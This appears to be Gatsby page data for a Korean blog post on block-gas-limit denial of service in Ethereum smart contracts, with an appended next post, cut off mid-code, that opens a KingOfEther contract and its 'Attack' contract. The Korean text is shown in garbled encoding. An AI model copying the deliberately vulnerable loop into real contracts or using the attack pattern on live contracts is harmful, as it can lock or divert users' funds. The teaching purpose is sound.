{
    "componentChunkName": "component---src-templates-blog-template-js",
    "path": "/vulnerability/dos_with_block_gas_limit/dos_block_gas_limit/",
    "result": {"data":{"cur":{"id":"1ed2f3ad-7dcc-53e2-8502-18c0734dad6f","html":"<h1 id=\"-dosdenial-of-service-with-block-gas-limit\" style=\"position:relative;\"><a href=\"#-dosdenial-of-service-with-block-gas-limit\" aria-label=\" dosdenial of service with block gas limit permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ğŸ‘‹ DoS(Denial of Service) With Block Gas Limit</h1>\n<h2 id=\"ë“¤ì–´ê°€ê¸°ì „\" style=\"position:relative;\"><a href=\"#%EB%93%A4%EC%96%B4%EA%B0%80%EA%B8%B0%EC%A0%84\" aria-label=\"ë“¤ì–´ê°€ê¸°ì „ permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ë“¤ì–´ê°€ê¸°ì „</h2>\n<h3 id=\"gasë€-ë¬´ì—‡ì¸ê°€\" style=\"position:relative;\"><a href=\"#gas%EB%9E%80-%EB%AC%B4%EC%97%87%EC%9D%B8%EA%B0%80\" aria-label=\"gasë€ ë¬´ì—‡ì¸ê°€ permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>GASë€ ë¬´ì—‡ì¸ê°€?</h3>\n<p>ì´ë”ë¦¬ì›€ ë¸”ë¡ì²´ì¸ì˜ ë¸”ë¡ë“¤ì€ ê° ë¸”ë¡ë§ˆë‹¤ ì†Œë¹„ í•  ìˆ˜ ìˆëŠ” ê°€ìŠ¤ì˜ ìµœëŒ€ëŸ‰ì´ ì •í•´ì ¸ìˆë‹¤. ì¦‰ ê° ë¸”ë¡ì´ ì†Œë¹„í•  ìˆ˜ ìˆëŠ” ìµœëŒ€ëŸ‰ì„ ë„˜ì–´ì„ ë‹¤ë©´ <strong>transactionë“¤ì€ fail</strong> í•˜ê²Œëœë‹¤.</p>\n<hr>\n<h3 id=\"dos-with-block-gas-limit\" style=\"position:relative;\"><a href=\"#dos-with-block-gas-limit\" aria-label=\"dos with block gas limit permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>DoS With Block Gas Limit</h3>\n<p>ì—°ì‚°ë‹¹ Gasê°€ ì •í•´ì ¸ ìˆìœ¼ë©° smart contractë¥¼ ì‹¤í–‰í•  ë•Œ ê³„ì‚°ëœë‹¤. Block Gas Limit DOSì€ smart contractê°€ ì‹¤í–‰ë˜ê³  Gasë¥¼ ê³„ì‚°í• ë•Œ ìµœëŒ€ ì—°ì‚°ëŸ‰ì„ ì´ˆê³¼í•˜ë©´ ë°œìƒí•œë‹¤.\nì˜ˆë¥¼ ë“¤ì–´ë³´ê² ë‹¤.</p>\n<ol>\n<li>í•œ smart contractì— ì‚¬ìš©ìê°€ ë§ì•„ì§ì— ë”°ë¼ í¬ê¸°ê°€ ì¦ê°€í•˜ëŠ” Arrayê°€ ìˆë‹¤.</li>\n<li>smart contractì•ˆì—ëŠ” ê·¸ array ì „ì²´ë¥¼ ìˆœí™˜í•˜ëŠ” ì‘ì—…ì´ ìˆë‹¤.</li>\n<li>ì²˜ìŒì—ëŠ” ê´œì°®ì•˜ìœ¼ë‚˜ ì‹œê°„ì´ ì§€ë‚ ìˆ˜ë¡ Arrayê°€ ì»¤ì ¸ ì—°ìƒëŸ‰ì´ ì¦ê°€í•œë‹¤.</li>\n<li>ì—°ì‚°ëŸ‰ì´ ë„ˆë¬´ ë§ì•„ì ¸ Denial Of Serviceë¡œ ì´ì–´ì§ˆ ìˆ˜ ìˆë‹¤.</li>\n</ol>\n<p>ë³´ë‹¤ ì˜ ì´í•´í•˜ê¸° ìœ„í•´ Example Codeë¥¼ ì‚´í´ë³´ì!!</p>\n<hr>\n<h2 id=\"example-code\" style=\"position:relative;\"><a href=\"#example-code\" aria-label=\"example code permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Example code</h2>\n<p>ê°„ë‹¨í•œ codeë¡œ ì´í•´í•´ë³´ì!</p>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">struct</span> <span class=\"token class-name\">Payee</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token builtin\">address</span> addr<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">uint256</span> value<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\nPayee<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> payees<span class=\"token punctuation\">;</span>\n<span class=\"token builtin\">uint256</span> nextPayeeIndex<span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">function</span> <span class=\"token function\">pay</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token comment\">//pay something</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">function</span> <span class=\"token function\">payOut</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token builtin\">uint256</span> i <span class=\"token operator\">=</span> nextPayeeIndex<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">&lt;</span> payees<span class=\"token punctuation\">.</span>length <span class=\"token operator\">&amp;&amp;</span> msg<span class=\"token punctuation\">.</span>gas <span class=\"token operator\">></span> <span class=\"token number\">200000</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n      payees<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>addr<span class=\"token punctuation\">.</span><span class=\"token function\">send</span><span class=\"token punctuation\">(</span>payees<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n      i<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    nextPayeeIndex <span class=\"token operator\">=</span> i<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<p>ì´ contractëŠ” Payeeë“¤ì—ê²Œ ìˆœì°¨ì ìœ¼ë¡œ í™˜ë¶ˆí•´ì£¼ëŠ” functionì„ í¬í•¨í•˜ê³  ìˆë‹¤.\nì‹œë‚˜ë¦¬ì˜¤ëŠ” ì´ë ‡ë‹¤.</p>\n<ol>\n<li>pay()ë¥¼  í†µí•´ payees Arrayì— addressì™€ valueë¥¼ ì¶”ê°€í•œë‹¤.</li>\n<li>ì ì  payees[]ì˜ í¬ê¸°ê°€ ëŠ˜ì–´ë‚œë‹¤.</li>\n<li>payOut()ì„ ì‹¤í–‰í• ë•Œê°€ ë˜ì–´ ì‹¤í–‰ì‹œí‚¨ë‹¤.</li>\n<li>payOut()ì€ payees[] ì „ì²´ë¥¼ ìˆœí™˜í•˜ë©° valueë¥¼ ì§€ê¸‰í•œë‹¤.</li>\n<li>payOut()ì—ì„œ whileë¬¸ì„ ì‹¤í–‰ì‹œí‚¤ë‹¤ block gas limitë¥¼ ì´ˆê³¼í•œë‹¤.</li>\n<li>ê²°êµ­ payOut()ë¥¼ ì‹¤í–‰ í•  ìˆ˜ ì—†ì–´, ETHê°€ lockëœë‹¤.</li>\n</ol>\n<hr>\n<h2 id=\"another-exmample\" style=\"position:relative;\"><a href=\"#another-exmample\" aria-label=\"another exmample permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Another Exmample</h2>\n<p>ìœ„ Example CodeëŠ” smart contractë¥¼ ë§Œë“¤ë•Œ ê°œë°œìì˜ ì‹¤ìˆ˜ë¡œ ì¼ì–´ë‚  ìˆ˜ ìˆë‹¤.\ní•˜ì§€ë§Œ ê°œë°œìì˜ ì‹¤ìˆ˜ê°€ ì•„ë‹ˆë”ë¼ë„ ê³µê²©ìëŠ” ë†’ì€ ê°€ìŠ¤ ê°€ê²©ìœ¼ë¡œ transactionì„ ì¼ìœ¼í‚´ìœ¼ë¡œì¨ transactionì´ ë¸”ë¡ì²´ì¸ì— í¬í•¨ë˜ëŠ” ê²ƒì„ ë§‰ì„ ìˆ˜ ìˆë‹¤.</p>\n<p>ì´ ê³µê²©ì€ ë„ë°• Dappì¸ Fomo3Dì—ì„œ ë°œìƒí–ˆì—ˆë‹¤. Fomo3DëŠ” íŠ¹ì • ì¡°ê±´ì—ì„œ í‚¤ë¥¼ ë°œê¸‰í•´ì£¼ê³  ë§ˆì§€ë§‰ìœ¼ë¡œ Keyë¥¼ ë°›ì€ ì‚¬ëŒì—ê²Œ ë³´ìƒì„ ì£¼ëŠ” ì‹œìŠ¤í…œì´ë‹¤. ë³´ìƒì€ íƒ€ì´ë¨¸ê°€ ëë‚˜ëŠ” ì‹œì ì— ì£¼ì–´ì§€ê²Œë˜ê³  Keyë¥¼ ìƒˆë¡œ ë°›ì„ ë•Œë§ˆë‹¤ íƒ€ì´ë¨¸ì˜ ì‹œê°„ì´ ëŠ˜ì–´ë‚œë‹¤.</p>\n<p>Fomo3Dì—ì„œëŠ” <strong>Block Stuffing</strong> ì„ í†µí•´ì„œ etherë¥¼ ê°€ë¡œì±˜ë‹¤. BLock Stuffingì„ ë¸”ë¡ì„ ì±„ìš´ë‹¤ëŠ” ëœ»ìœ¼ë¡œ ë¸”ë¡ì„ ì±„ì›Œ Gas Limitì„ ë„˜ê²Œ ë§Œë“¤ê³  ì´ë¡œì¸í•´ transactionì´ ë¸”ë¡ì— ê¸°ë¡ë˜ì§€ ëª»í•˜ê²Œ í•˜ëŠ” ê²ƒì´ë‹¤.</p>\n<p>ì‹œë‚˜ë¦¬ì˜¤ëŠ” ì´ë ‡ë‹¤.</p>\n<ol>\n<li>attackerê°€ íŠ¹ì • ì¡°ê±´ì„ ë§Œì¡±ì‹œì¼œ <strong>í‚¤ë¥¼</strong> ë°œê¸‰ë°›ëŠ”ë‹¤.</li>\n<li>ì´í›„ íƒ€ì´ë¨¸ê°€ ëë‚ ë•Œê¹Œì§€ block stuffingì„ í†µí•´ ë‹¤ë¥¸ transactionì„ ê¸°ë¡í•˜ì§€ ëª»í•˜ê²Œ í•œë‹¤.</li>\n<li>íƒ€ì´ë¨¸ê°€ ëë‚˜ëŠ” ì‹œê°„ì— ë³´ìƒì„ ë°›ëŠ”ë‹¤.</li>\n</ol>\n<p>ì•„ë§ˆ blockì„ ì±„ìš°ëŠ”ë° ë§ì€ ëˆì´ ë“¤ì§€ë§Œ ê·¸ë§Œí¼ ë³´ìƒì´ í™•ì‹¤í•˜ë‹¤ë©´ attackì„ ë°›ì„ ì—¬ì§€ê°€ ìˆë‹¤.</p>\n<hr>\n<h2 id=\"how-to-prevent\" style=\"position:relative;\"><a href=\"#how-to-prevent\" aria-label=\"how to prevent permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>How to prevent?</h2>\n<p>ì‹œê°„ì´ ì§€ë‚¨ì— ë”°ë¼ í¬ê¸°ê°€ ì¦ê°€í•˜ëŠ” arrayëŠ” ì‚¬ìš©ì— ì£¼ì˜í•´ì•¼í•œë‹¤. ë˜í•œ ê·¸ arrayë¥¼ ìˆœí™˜í•˜ëŠ” ë°˜ë³µë¬¸ ì‘ì—…ë„ í”¼í•´ì•¼í•œë‹¤.\në˜í•œ ê¼­ ì²˜ë¦¬í•´ì•¼í•˜ëŠ” ê²½ìš°ì—ëŠ” DOS unexpected revertì—ì„œ ì•Œì•„ë³´ì•˜ë˜ pull over push ë°©ë²•ì„ ì‚¬ìš©í•´ transactionì„ ì²˜ë¦¬í•´ì•¼í•œë‹¤.</p>\n<ul>\n<li>pull over push: contractë¥¼ ë¶„ë¦¬í•¨ìœ¼ë¡œì¨ attackerì˜ ê³µê²©ì„ attackerì˜ ì†ì‹¤ë¡œë§Œ ì²˜ë¦¬ í•  ìˆ˜ ìˆë‹¤. ìœ„ì˜ ì½”ë“œë¥¼ pull over pushë¡œ ë°”ê¾¸ì–´ë³´ì•˜ë‹¤.</li>\n</ul>\n<hr>\n<h2 id=\"ë§ˆë¬´ë¦¬\" style=\"position:relative;\"><a href=\"#%EB%A7%88%EB%AC%B4%EB%A6%AC\" aria-label=\"ë§ˆë¬´ë¦¬ permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ë§ˆë¬´ë¦¬</h2>\n<p>DOSëŠ” EVMê³¼ í° ê´€ë ¨ì´ ìˆëŠ” ì·¨ì•½ì  ê°™ë‹¤. EVMì˜ ê°€ìŠ¤ì²´ê³„ë¥¼ ê³µë¶€í•¨ìœ¼ë¡œì¨ GAS Optimizationë“±ì— ëŒ€í•´ ê¹Šê²Œ ë°°ìš¸ ìˆ˜ ìˆì„ ê²ƒ ê°™ë‹¤! ì·¨ì•½ì  ì´í›„ì—ëŠ” EVMì— ëŒ€í•œ ì—°êµ¬ë¥¼ í•´ë³¸ë‹¤ë©´ ë” ì„±ì¥í•  ìˆ˜ ìˆì„ ê²ƒ ê°™ë‹¤. ë!!!</p>\n<hr>\n<h3 id=\"reference\" style=\"position:relative;\"><a href=\"#reference\" aria-label=\"reference permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Reference</h3>\n<ul>\n<li><a href=\"https://swcregistry.io/docs/SWC-128\">https://swcregistry.io/docs/SWC-128</a></li>\n<li><a href=\"https://consensys.github.io/smart-contract-best-practices/known_attacks/#gas-limit-dos-on-a-contract-via-unbounded-operations\">https://consensys.github.io/smart-contract-best-practices/known_attacks/#gas-limit-dos-on-a-contract-via-unbounded-operations</a></li>\n</ul>\n<div class=\"table-of-contents\">\n<ul>\n<li>\n<p><a href=\"#%EB%93%A4%EC%96%B4%EA%B0%80%EA%B8%B0%EC%A0%84\">ë“¤ì–´ê°€ê¸°ì „</a></p>\n<ul>\n<li><a href=\"#gas%EB%9E%80-%EB%AC%B4%EC%97%87%EC%9D%B8%EA%B0%80\">GASë€ ë¬´ì—‡ì¸ê°€?</a></li>\n<li><a href=\"#dos-with-block-gas-limit\">DoS With Block Gas Limit</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#example-code\">Example code</a></p>\n</li>\n<li>\n<p><a href=\"#another-exmample\">Another Exmample</a></p>\n</li>\n<li>\n<p><a href=\"#how-to-prevent\">How to prevent?</a></p>\n</li>\n<li>\n<p><a href=\"#%EB%A7%88%EB%AC%B4%EB%A6%AC\">ë§ˆë¬´ë¦¬</a></p>\n<ul>\n<li><a href=\"#reference\">Reference</a></li>\n</ul>\n</li>\n</ul>\n</div>","excerpt":"ğŸ‘‹ DoS(Denial of Service) With Block Gas Limit ë“¤ì–´ê°€ê¸°ì „ GASë€ ë¬´ì—‡ì¸ê°€? ì´ë”ë¦¬ì›€ ë¸”ë¡ì²´ì¸ì˜ ë¸”ë¡ë“¤ì€ ê° ë¸”ë¡ë§ˆë‹¤ ì†Œë¹„ í•  ìˆ˜ ìˆëŠ” ê°€ìŠ¤ì˜ ìµœëŒ€ëŸ‰ì´ ì •í•´ì ¸ìˆë‹¤. ì¦‰ ê° ë¸”ë¡ì´ ì†Œë¹„í•  ìˆ˜ ìˆëŠ” ìµœëŒ€ëŸ‰ì„ ë„˜ì–´ì„ ë‹¤ë©´ transactionë“¤ì€ fail í•˜ê²Œëœë‹¤. DoS With Block Gas Limit ì—°ì‚°ë‹¹ Gasê°€ ì •í•´ì ¸ ìˆìœ¼ë©° smart contractë¥¼ ì‹¤í–‰í•  ë•Œ ê³„ì‚°ëœë‹¤. Block Gas Limit DOSì€ smart contractê°€ ì‹¤í–‰ë˜ê³  Gasë¥¼ ê³„ì‚°í• ë•Œ ìµœëŒ€ ì—°ì‚°ëŸ‰ì„ ì´ˆê³¼í•˜ë©´ ë°œìƒí•œë‹¤.\nì˜ˆë¥¼ ë“¤ì–´ë³´ê² ë‹¤. í•œ smart contractì— ì‚¬ìš©ìê°€ ë§ì•„ì§ì— ë”°ë¼ í¬ê¸°ê°€ ì¦ê°€í•˜ëŠ” Arrayê°€ ìˆë‹¤. smart contractì•ˆì—ëŠ” ê·¸ array ì „ì²´ë¥¼ ìˆœí™˜í•˜ëŠ” ì‘ì—…ì´ ìˆë‹¤. ì²˜ìŒì—ëŠ” ê´œì°®ì•˜ìœ¼ë‚˜ ì‹œê°„ì´ ì§€ë‚ ìˆ˜ë¡ Arrayê°€ ì»¤ì ¸ ì—°ìƒëŸ‰ì´ ì¦ê°€í•œë‹¤. ì—°ì‚°ëŸ‰ì´ ë„ˆë¬´ ë§ì•„ì ¸ Denial Of Serviceë¡œ ì´ì–´ì§ˆ ìˆ˜ ìˆë‹¤. ë³´ë‹¤ ì˜ ì´í•´â€¦","frontmatter":{"date":"December 31, 2021","title":"(ì·¨ì•½ì  ì‹œë¦¬ì¦ˆ 7) DOS With Block Gas Limit","categories":"ì·¨ì•½ì ë¶„ì„","author":"í•œì„±ì›","emoji":"ğŸ§¢"},"fields":{"slug":"/vulnerability/dos_with_block_gas_limit/dos_block_gas_limit/"}},"next":{"id":"be3c0ee9-047a-5710-97f4-2b9135ecc85a","html":"<h1 id=\"-unexpected-revert\" style=\"position:relative;\"><a href=\"#-unexpected-revert\" aria-label=\" unexpected revert permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ğŸ‘‹ Unexpected Revert</h1>\n<h2 id=\"unexpected-revertë€\" style=\"position:relative;\"><a href=\"#unexpected-revert%EB%9E%80\" aria-label=\"unexpected revertë€ permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Unexpected Revertë€?</h2>\n<p>Unexpected RevertëŠ” ì´ë¦„ì—ì„œ ì•Œ ìˆ˜ ìˆë“¯ì´, íŠ¸ëœì­ì…˜ì„ ê³ ì˜ì  revertì‹œí‚´ìœ¼ë¡œì¨ ìŠ¤ë§ˆíŠ¸ ê³„ì•½ì´ ì‘ë™ë˜ì§€ ì•ŠëŠ” ìƒíƒœë¡œ ë§Œë“œëŠ” ì·¨ì•½ì„±ì…ë‹ˆë‹¤.</p>\n<hr>\n<h2 id=\"example-code\" style=\"position:relative;\"><a href=\"#example-code\" aria-label=\"example code permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Example code</h2>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">contract</span> <span class=\"token class-name\">KingOfEther</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> king<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">uint</span> <span class=\"token keyword\">public</span> balance<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">claimThrone</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>value <span class=\"token operator\">></span> balance<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Need to pay more to become the king\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span> sent<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> king<span class=\"token punctuation\">.</span>call<span class=\"token punctuation\">{</span>value<span class=\"token punctuation\">:</span> balance<span class=\"token punctuation\">}</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>sent<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Failed to send Ether\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        balance <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">;</span>\n        king <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">Attack</span> <span class=\"token punctuation\">{</span>\n    KingOfEther kingOfEther<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span>KingOfEther _kingOfEther<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        kingOfEther <span class=\"token operator\">=</span> <span class=\"token function\">KingOfEther</span><span class=\"token punctuation\">(</span>_kingOfEther<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">attack</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">{</span>\n        kingOfEther<span class=\"token punctuation\">.</span>claimThrone<span class=\"token punctuation\">{</span>value<span class=\"token punctuation\">:</span> msg<span class=\"token punctuation\">.</span>value<span 